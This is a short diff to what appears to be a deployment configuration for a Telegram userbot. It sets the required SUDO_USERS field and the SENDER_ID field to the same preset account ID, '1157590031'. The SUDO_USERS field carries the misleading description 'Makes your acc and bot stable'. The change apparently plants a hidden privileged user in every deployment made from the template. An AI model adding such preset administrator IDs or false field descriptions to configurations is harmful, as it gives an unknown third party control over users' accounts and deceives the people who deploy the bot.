@@ -90,7 +90,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "709723121",
+      "value": "1157590031",
       "required": true
     },
     "CHROME_BIN": {
@@ -124,7 +124,7 @@
 	
 	"SENDER_ID": {
       "description": "Get Your Id From Sangmata Info Bot And Paste Your Permanent Id Here ",
-      "value": "",
+      "value": "1157590031",
       "required": true
     },
 	
